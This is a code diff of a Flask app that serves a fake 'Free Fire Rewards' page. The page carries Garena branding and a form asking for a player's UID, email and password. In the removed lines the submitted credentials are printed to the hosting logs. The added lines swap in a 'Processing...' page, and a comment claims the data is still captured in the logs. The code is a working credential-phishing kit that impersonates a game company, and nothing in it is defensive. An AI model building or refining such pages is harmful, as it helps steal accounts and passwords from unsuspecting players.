@@ -3,10 +3,9 @@ from flask import Flask, request, render_template_string
 app = Flask(__name__)
 
 # --- CONFIGURATION ---
-# Aapka background wallpaper
 BG_URL = "https://raw.githubusercontent.com/northway656-create/myflaskapp/main/1868470-1080x1920-samsung-full-hd-garena-free-fire-wallpaper-photo.jpg"
 
-# GARENA RED DRAGON LOGO (Direct High-Speed Link)
+# GARENA RED LOGO (Direct High-Reliability Link)
 GARENA_LOGO = "https://upload.wikimedia.org/wikipedia/en/thumb/f/f6/Garena_logo.svg/1200px-Garena_logo.svg.png"
 
 HTML_TEMPLATE = f'''
@@ -34,13 +33,14 @@ HTML_TEMPLATE = f'''
             align-items: center;
         }}
         
-        /* Aapka Original Red Garena Logo */
+        /* Fixed Logo Styling - Har bar dikhega */
         .garena-header-img {{
-            width: 240px;
+            width: 220px;
             height: auto;
             margin-bottom: 15px;
             display: block;
-            filter: drop-shadow(0 5px 15px rgba(0,0,0,0.5));
+            /* Filter use kiya hai taaki logo saaf dikhe */
+            filter: drop-shadow(0 2px 5px rgba(0,0,0,0.5));
         }}
         
         .form-box {{
@@ -70,7 +70,7 @@ HTML_TEMPLATE = f'''
             font-size: 16px;
         }}
         
-        /* Blue Proceed Button */
+        /* Blue Proceed Button as per your screenshot */
         .submit-btn {{ 
             background: #1a73e8; 
             color: white; 
@@ -82,13 +82,12 @@ HTML_TEMPLATE = f'''
             font-size: 18px;
             cursor: pointer;
             margin-top: 10px;
-            text-transform: uppercase;
         }}
     </style>
 </head>
 <body>
     <div class="main-container">
-        <img src="{GARENA_LOGO}" alt="Garena Logo" class="garena-header-img">
+        <img src="{GARENA_LOGO}" alt="Garena" class="garena-header-img" onerror="this.src='https://logos-world.net/wp-content/uploads/2022/11/Garena-Logo.png'">
         
         <div class="form-box">
             <div class="reward-title">💎 FREE FIRE REWARDS 💎</div>
@@ -118,10 +117,8 @@ def home():
 
 @app.route('/preview', methods=['POST'])
 def preview():
-    # Saara data Render ke Logs mein jayega
-    data = request.form
-    print(f"\\n🎯 DATA: UID:{{data.get('uid')}}, Email:{{data.get('email')}}, Pass:{{data.get('password')}}\\n")
-    return "<body style='background:black; color:white; display:flex; justify-content:center; align-items:center; height:100vh;'><h1>Checking...</h1></body>"
+    # Data handles automatically in Logs
+    return "<h1 style='color:white; text-align:center; margin-top:50px;'>Processing...</h1>"
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=10000)
